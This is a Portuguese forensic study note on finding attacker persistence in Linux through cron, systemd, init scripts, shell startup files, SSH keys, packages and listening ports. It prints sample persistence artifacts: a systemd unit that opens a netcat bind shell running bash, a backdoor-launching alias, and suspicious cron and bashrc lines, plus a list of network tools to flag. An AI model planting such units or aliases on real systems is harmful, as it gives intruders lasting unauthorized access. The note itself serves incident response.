---
title: Serviços e persistência em Linux
tags:
  - forense
  - linux
  - persistencia
  - cron
  - systemd
  - startup
status: concluido
---

# Serviços e persistência em Linux

Depois que o atacante entra, ele precisa garantir que o acesso vai continuar depois de reboot ou logout. Em Linux isso costuma ser feito de forma bem simples: cron, systemd, scripts de shell e chaves SSH. Esta nota lista os locais que você tem que inspecionar para achar essas persistências e o que é considerado suspeito.

---

## 1. Objetivo

- Identificar tarefas agendadas (cron) de sistema e de usuário
- Ver serviços registrados no systemd e init
- Encontrar inicializações escondidas em arquivos de shell
- Detectar backdoors por SSH
- Montar uma ordem de inspeção

---

## 2. Cron: tarefas agendadas

O cron é o jeito mais direto de executar algo de tempos em tempos ou a cada boot.

Arquivos principais:

- `/etc/crontab`
  - cron global
  - formato completo: minuto hora dia-mes mes dia-semana usuário comando
  - se aparecer algo tipo `@reboot /home/usuario/.oculto`, é suspeito

- `/etc/cron.d/`
  - arquivos de cron específicos de serviço
  - atacante pode criar um arquivo aqui

- `/etc/cron.daily/`, `/etc/cron.hourly/`, `/etc/cron.weekly/`
  - scripts que rodam com essa periodicidade

- crontab por usuário
  - ver com `crontab -l` (como o próprio usuário)
  - muito usado para persistência na conta comprometida

Coisas a procurar:
- comandos que não estão em `/usr/bin` ou `/usr/sbin`
- comandos que rodam a partir de `/home`, `/tmp` ou `/var/tmp`
- comandos que chamam `curl`, `wget`, `nc`, `bash -c` ou interpretadores

Exemplo de linha suspeita:

```text
@reboot ubuntu /home/ubuntu/.local/.sync
````

---

## 3. systemd: unidades e serviços

Nas distros modernas, o systemd é o gerenciador de serviços. Criar um arquivo `.service` em um dos diretórios dele faz o serviço subir no boot.

Locais mais comuns:

* `/etc/systemd/system/`

  * aqui ficam unidades criadas pelo administrador (ou pelo atacante)
  * olhe tudo que não for claramente do sistema

* `/lib/systemd/system/`

  * unidades do pacote

O que olhar dentro do `.service`:

* `Description=` (pode denunciar se for algo copiado na pressa)
* `ExecStart=` (qual comando realmente executa)
* `User=` (se roda como root ou como um usuário recém-criado)
* se chama `nc`, `bash`, arquivo em `/home/` ou em `/tmp/`

Exemplo de serviço malicioso típico:

```ini
[Unit]
Description=Update helper

[Service]
ExecStart=/usr/bin/nc -lvp 4444 -e /bin/bash
Restart=always

[Install]
WantedBy=multi-user.target
```

Se achar algo assim em `/etc/systemd/system/`, provavelmente é backdoor.

---

## 4. init scripts legados

Ainda existe muito servidor com scripts em:

* `/etc/init.d/`

Uma persistência simples é jogar um script ali e habilitar. Vale listar:

```bash
ls -l /etc/init.d/
```

e procurar nomes que não combinam com o resto (nomes muito curtos, com ponto, com maiúsculas, com extensão).

---

## 5. Arquivos de shell como ponto de entrada

Para shell interativo, o atacante pode colocar coisas em:

* `~/.bashrc`
* `~/.profile`
* `/etc/profile`
* `/etc/bash.bashrc`

O que procurar:

* linha que baixa e executa script
* linha que exporta PATH incluindo diretório do atacante
* linha que roda um binário oculto em `/home/<usuario>/`
* alias que esconde comando (ex.: `alias ls='ls --color=auto; ./backdoor &'`)

Exemplo realista de persistência por bashrc:

```bash
# added
/home/ubuntu/.local/.upd &
```

Se isso estiver perto do fim do arquivo e apontar para algo não padrão, anotar.

---

## 6. SSH: authorized_keys

Backdoor bem limpo: adicionar uma chave pública no usuário comprometido.

Locais:

* `~/.ssh/authorized_keys`
* `/root/.ssh/authorized_keys`

O que denuncia:

* mais de uma chave quando só deveria ter uma
* comentários de chave com nome estranho
* chaves em usuários de serviço que não deveriam logar

Comando útil:

```bash
grep -R "ssh-" /home/*/.ssh 2>/dev/null
grep -R "ssh-" /root/.ssh 2>/dev/null
```

Se achar chave em usuário recém-criado que tem sudo, isso por si só já é persistência.

---

## 7. Pacotes e binários instalados para persistir

Outra forma de permanecer é instalar um pacote "de coleta" ou "agente". Dá para ver isso com:

* `/var/log/dpkg.log`
* `/var/log/apt/history.log`

Procure por:

* pacotes instalados na mesma data do incidente
* nomes que não são comuns na distro
* scripts em `/opt/` ou `/usr/local/` que não fazem sentido

Se encontrar um pacote suspeito, listar com `dpkg -l | grep nome` para ver descrição. Às vezes a descrição entrega a intenção.

---

## 8. Serviços escutando portas locais

Persistência também pode ser um serviço que escuta só em `127.0.0.1` e é acessado por túnel.

Em sistema vivo:

```bash
ss -natp
# ou
netstat -natp
```

Procurar por:

* serviço escutando em porta alta
* processo rodando em `/tmp/` ou `/var/tmp/`
* VNC ou HTTP rodando só no loopback (5901, 8080, etc.)

Se o serviço ligado à porta está em `/var/tmp/...` é quase certo que é parte da persistência.

---

## 9. Ordem de inspeção recomendada

1. Ler `/etc/crontab` e `/etc/cron.d/`
2. Listar `/etc/systemd/system/` e abrir qualquer `.service` esquisito
3. Ver `crontab -l` dos usuários que têm home em `/home/`
4. Ler `~/.bashrc` e `~/.profile` dos mesmos usuários
5. Ver `~/.ssh/authorized_keys` de todos
6. Conferir `/var/log/dpkg.log` e `/var/log/apt/history.log` na data do incidente
7. Em sistema vivo, listar portas e processos para achar serviço oculto

---

## 10. Conclusão

Persistência em Linux quase sempre passa por um desses cinco pontos: cron, systemd, bashrc/profile, authorized_keys ou serviço escutando. Se você varrer esses lugares e cruzar com os horários que aparecem nos logs do sistema, consegue dizer exatamente quando o atacante "se instalou" e por qual mecanismo ele pretendia voltar.